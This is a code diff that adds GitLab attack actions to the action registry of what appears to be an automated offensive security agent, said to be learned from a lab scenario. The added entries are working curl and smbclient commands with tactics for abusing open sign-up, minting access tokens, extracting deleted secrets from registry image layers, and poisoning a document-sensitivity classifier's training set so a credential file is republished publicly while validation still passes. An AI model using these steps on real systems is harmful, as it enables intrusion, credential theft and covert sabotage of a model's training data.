@@ -703,6 +703,41 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="Audit dependency files for supply chain attack indicators."),
 
     # --- Supply chain: GitLab CI/CD (self-learned from Shadow Supply chain 4) ---
+    "gitlab_open_register": _a("gitlab_open_register",
+        ["curl -sk $URL/users/sign_up -o /dev/null -w 'signup_http=%{http_code}\\n'",
+         "# register (auto-confirmed) -> Reporter on internal groups, Developer on some repos"],
+        risk="propose", runnable=False,
+        note="If /users/sign_up is open, register an account (auto-confirmed). Registration often "
+             "auto-grants Reporter on internal groups + Developer on a contributions repo."),
+    "gitlab_create_pat": _a("gitlab_create_pat",
+        ["curl -sk -b <session> -X POST $URL/-/user_settings/personal_access_tokens "
+         "-H 'Content-Type: application/json' "
+         "-d '{\"personal_access_token\":{\"name\":\"t\",\"scopes\":[\"api\",\"read_api\","
+         "\"read_repository\",\"write_repository\",\"read_registry\"]}}'"],
+        risk="propose", runnable=False,
+        note="Mint a PAT via the web CSRF flow. The token has a .NN.xxxx suffix — don't truncate "
+             "at the dot. A PAT tags gitlab_token and unlocks the CI-variable/env exfil chain."),
+    "gitlab_registry_pull_layers": _a("gitlab_registry_pull_layers",
+        ["# auth realm host -> registry, then pull every layer (secrets survive COPY+rm):",
+         "curl -sk 'https://$IP:5050/v2/<repo>/tags/list' -H 'Host: $IP'",
+         "curl -sk 'https://$IP:5050/v2/<repo>/manifests/<tag>' "
+         "-H 'Accept: application/vnd.docker.distribution.manifest.v2+json'",
+         "# for each layer digest: GET /v2/<repo>/blobs/<digest> | tar tzf - ; extract secrets"],
+        risk="propose", runnable=False,
+        note="A file COPYed then rm'd in a later layer still exists in the earlier layer "
+             "(id_ed25519.enc here). Pull all blobs and grep for keys/tokens."),
+    "gitlab_training_data_poison": _a("gitlab_training_data_poison",
+        ["# only the training-data file is push-allowed (server hook blocks branches/other files):",
+         "curl -sk -H 'PRIVATE-TOKEN: $TOKEN' -X POST "
+         "$URL/api/v4/projects/$PROJECT_ID/repository/commits -H 'Content-Type: application/json' "
+         "-d '{\"branch\":\"main\",\"commit_message\":\"update training data\",\"actions\":"
+         "[{\"action\":\"update\",\"file_path\":\"training-data/clinical_docs_train.jsonl\","
+         "\"content\":\"<credential-vocabulary samples labelled NON-SENSITIVE + a few SENSITIVE>\"}]}'",
+         "smbclient //$IP/public-docs -N -c 'ls; get flagged_doc.txt'"],
+        risk="propose", runnable=False,
+        note="LLM04: poison the classifier's training set so a withheld (SENSITIVE) credential doc "
+             "reclassifies NON-SENSITIVE and is republished to the public share. Keep some pure-PII "
+             "SENSITIVE samples so validation still passes. Cadence ~40 min."),
     "gitlab_ci_variables": _a("gitlab_ci_variables",
         ["curl -sk -H 'PRIVATE-TOKEN: $TOKEN' $URL/api/v4/projects/$PROJECT_ID/variables",
          "curl -sk -H 'PRIVATE-TOKEN: $TOKEN' $URL/api/v4/groups/$GROUP_ID/variables"],
